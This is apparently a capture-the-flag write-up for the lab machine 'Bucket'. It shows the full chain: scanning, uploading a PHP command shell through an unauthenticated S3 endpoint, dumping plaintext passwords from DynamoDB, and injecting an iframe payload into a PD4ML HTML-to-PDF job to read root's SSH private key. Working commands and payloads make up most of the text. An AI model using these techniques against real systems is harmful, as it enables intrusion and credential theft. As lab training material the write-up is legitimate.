# Bucket

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 10.129.65.220         
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-25 21:28 +08
Nmap scan report for 10.129.65.220
Host is up (0.0070s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Did a detailed scan as well:

```
$ nmap -p 80 -sC -sV --min-rate 4000 10.129.65.220
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-25 21:29 +08
Nmap scan report for 10.129.65.220
Host is up (0.0065s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://bucket.htb/
Service Info: Host: 127.0.1.1
```

We can add `bucket.htb` to our `/etc/hosts` file to visit the web application.

### Web Enum -> S3 Bucket Shell Upload

The website was looked to be a custom platform:

<figure><img src="../../../.gitbook/assets/image (4162).png" alt=""><figcaption></figcaption></figure>

When I looked through the page source, I could see that there was a subdomain present:

<figure><img src="../../../.gitbook/assets/image (4163).png" alt=""><figcaption></figcaption></figure>

It seems that this uses the AWS S3 Bucket to store images on the website. When we add the subdomain to the `/etc/hosts` file, we can see that images are loaded:

<figure><img src="../../../.gitbook/assets/image (4164).png" alt=""><figcaption></figcaption></figure>

S3 Bucket is a cloud storage provider for objects, and it too can have misconfigurations. We only know that the bucket for the web application is called `adserver`. However, it's unlikely this bucket is actually publicly listed (at least I don't think so).

To enumerate this, we can use the `--endpoint-url` flag with `aws` to specify where we send the requests.&#x20;

```
$ sudo aws s3 --endpoint-url http://s3.bucket.htb ls s3://adserver
Unable to locate credentials. You can configure credentials by running "aws configure".
```

It seems that we need credentials. Based on Hacktricks Cloud, it is possible for unauthenticated access with null credentials.&#x20;

```
$ sudo aws configure                                              
AWS Access Key ID [None]: test123
AWS Secret Access Key [None]: test123
Default region name [None]:        
Default output format [None]:
$ sudo aws s3 --endpoint-url http://s3.bucket.htb ls s3://adserver
                           PRE images/
2023-08-25 21:43:04       5344 index.html
```

Great! We now have access to the files within the S3 Bucket instance. We can try to write files to the instance, and find that it works:

```
$ sudo aws s3 --endpoint-url http://s3.bucket.htb cp test.txt s3://adserver
upload: ./test.txt to s3://adserver/test.txt

$ sudo aws s3 --endpoint-url http://s3.bucket.htb ls s3://adserver         
                           PRE images/
2023-08-25 21:43:04       5344 index.html
2023-08-25 21:44:14         17 test.txt

$ curl http://bucket.htb/test.txt
ihavewriteaccess
```

Using this, we can try to write a shell of some sorts. The first thing that came to mind was PHP, since this wasn't a wasn't an IIS server.&#x20;

```
$ sudo aws s3 --endpoint-url http://s3.bucket.htb cp cmd.php s3://adserver 
upload: ./cmd.php to s3://adserver/cmd.php

$ curl http://bucket.htb/cmd.php?cmd=id                           
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This worked! Now we can easily gain a reverse shell:

<figure><img src="../../../.gitbook/assets/image (4165).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Project Files -> DynamoDB SSH Creds

We cannot read the user flag yet. Within the `/var/www` file, there is another `bucket-app` file:

```
www-data@bucket:/var/www$ ls -la
total 16
drwxr-xr-x   4 root root 4096 Feb 10  2021 .
drwxr-xr-x  14 root root 4096 Feb 10  2021 ..
drwxr-x---+  4 root root 4096 Feb 10  2021 bucket-app
drwxr-xr-x   2 root root 4096 Aug 25 13:49 html
```

There's a `+` at the end of it, meaning that there are extended privileges to this file. We can enumerate it using `getfacl`:

```
www-data@bucket:/var/www$ getfacl bucket-app/
# file: bucket-app/
# owner: root
# group: root
user::rwx
user:roy:r-x
group::r-x
mask::r-x
other::---
```

`roy` can read this. The user had a few files within their directory:

```
www-data@bucket:/home/roy$ ls -la
total 28
drwxr-xr-x 3 roy  roy  4096 Sep 24  2020 .
drwxr-xr-x 3 root root 4096 Sep 16  2020 ..
lrwxrwxrwx 1 roy  roy     9 Sep 16  2020 .bash_history -> /dev/null
-rw-r--r-- 1 roy  roy   220 Sep 16  2020 .bash_logout
-rw-r--r-- 1 roy  roy  3771 Sep 16  2020 .bashrc
-rw-r--r-- 1 roy  roy   807 Sep 16  2020 .profile
drwxr-xr-x 3 roy  roy  4096 Sep 24  2020 project
-r-------- 1 roy  roy    33 Aug 25 13:27 user.txt
```

The `db.php` file included some code for the DynamoDB instance:

```
www-data@bucket:/home/roy/project$ cat db.php 
<?php
require 'vendor/autoload.php';
date_default_timezone_set('America/New_York');
use Aws\DynamoDb\DynamoDbClient;
use Aws\DynamoDb\Exception\DynamoDbException;

$client = new Aws\Sdk([
    'profile' => 'default',
    'region'  => 'us-east-1',
    'version' => 'latest',
    'endpoint' => 'http://localhost:4566'
]);

$dynamodb = $client->createDynamoDb();
```

Now that we know this is running, we can enumerate it from our machine that already has `aws configure` configured.&#x20;

```
$ sudo aws dynamodb --endpoint-url http://s3.bucket.htb list-tables
{
    "TableNames": [
        "users"
    ]
}
```

The database also allows for unauthenticated access. We can read the stuff within this table:

```
$ sudo aws dynamodb --endpoint-url http://s3.bucket.htb scan --table-name users
{
    "Items": [
        {
            "password": {
                "S": "Management@#1@#"
            },
            "username": {
                "S": "Mgmt"
            }
        },
        {
            "password": {
                "S": "Welcome123!"
            },
            "username": {
                "S": "Cloudadm"
            }
        },
        {
            "password": {
                "S": "n2vM-<_K_Q:.Aa2"
            },
            "username": {
                "S": "Sysadm"
            }
        }
    ],
    "Count": 3,
    "ScannedCount": 3,
    "ConsumedCapacity": null
}
```

It seems that we have some credentials. The third one worked, and I could `su` to `roy`:

<figure><img src="../../../.gitbook/assets/image (4166).png" alt=""><figcaption></figcaption></figure>

### Bucket-App PD4ML LFI -> Root SSH Key

Now that we are `roy`, we can access the `bucket-app` file:

```
roy@bucket:/var/www/bucket-app$ ls -al
total 856
drwxr-x---+  4 root root   4096 Feb 10  2021 .
drwxr-xr-x   4 root root   4096 Feb 10  2021 ..
-rw-r-x---+  1 root root     63 Sep 23  2020 composer.json
-rw-r-x---+  1 root root  20533 Sep 23  2020 composer.lock
drwxr-x---+  2 root root   4096 Feb 10  2021 files
-rwxr-x---+  1 root root  17222 Sep 23  2020 index.php
-rwxr-x---+  1 root root 808729 Jun 10  2020 pd4ml_demo.jar
drwxr-x---+ 10 root root   4096 Feb 10  2021 vendor
```

The `index.php` had some code in it:

```php
<?php
require 'vendor/autoload.php';
use Aws\DynamoDb\DynamoDbClient;
if($_SERVER["REQUEST_METHOD"]==="POST") {
        if($_POST["action"]==="get_alerts") {
                date_default_timezone_set('America/New_York');
                $client = new DynamoDbClient([
                        'profile' => 'default',
                        'region'  => 'us-east-1',
                        'version' => 'latest',
                        'endpoint' => 'http://localhost:4566'
                ]);

                $iterator = $client->getIterator('Scan', array(
                        'TableName' => 'alerts',
                        'FilterExpression' => "title = :title",
                        'ExpressionAttributeValues' => array(":title"=>array("S"=>"Ransomware")),
                ));

                foreach ($iterator as $item) {
                        $name=rand(1,10000).'.html';
                        file_put_contents('files/'.$name,$item["data"]);
                }
                passthru("java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf");
        }
}
else
{
?>
```

This uses the DynamoDB's `alert` table, and it takes some data from there that is titled `Ransomware` and uses `pd4ml_demo.jar` to convert the HTML into a PDF. Searching for exploits for the `pd4ml.jar` program spoiled the box a bit:

<figure><img src="../../../.gitbook/assets/image (4167).png" alt=""><figcaption></figcaption></figure>

Anyways, reading the documentation for it provided me with the `<attachment>` tags.

{% embed url="https://pd4ml.com/support-topics/usage-examples/" %}

We could potentially use this for an LFI to read the private SSH key of `root`. First, we need to find out where this app is running on. Reading the Apache configuration files gave me just that:

```
$ cat /etc/apache2/sites-enabled/000-default.conf            
<VirtualHost 127.0.0.1:8000>
        <IfModule mpm_itk_module>
                AssignUserId root root
        </IfModule>
        DocumentRoot /var/www/bucket-app
</VirtualHost>
```

We need to forward port 8000 to our machine. I used `chisel`, but you can use `ssh` too since we have the credentials of `roy`. The application is being run as `root` as well, confirming that if we can exploit LFI, we can read every file in the machine.

Next, we need to create a new table within the DynamoDB instance with a `title` and `data` column. Afterwards, we need to insert 2 key pair values for it, with `title` being set to `Ransomware`, and the `data` field being set to our payload:

{% embed url="https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/getting-started-step-1.html" %}

<pre data-overflow="wrap"><code>$ sudo aws --endpoint-url http://s3.bucket.htb dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5

<strong>$ sudo aws --endpoint-url http://s3.bucket.htb/ dynamodb put-item --table-name alerts --item '{"title":{"S":"Ransomware"},"data":{"S":"&#x3C;html>&#x3C;head>&#x3C;/head>&#x3C;body>&#x3C;iframe src=\"/root/.ssh/id_rsa\">&#x3C;/iframe>&#x3C;/body>&#x3C;/html>"}}' 
</strong></code></pre>

Afterwards, based on the `index.php` code, we need to send a POST request with `action=get_alerts` to run our payload:

```
$ curl -X POST http://127.0.0.1:8000/index.php --data 'action=get_alerts'
```

We can then download the `result.pdf` file back to our machine via `base64` or `scp`. When viewed, this would give us the SSH key we need!

<figure><img src="../../../.gitbook/assets/image (4168).png" alt=""><figcaption></figcaption></figure>

Using this, we can `ssh` into the box:

<figure><img src="../../../.gitbook/assets/image (4169).png" alt=""><figcaption></figcaption></figure>

Rooted!
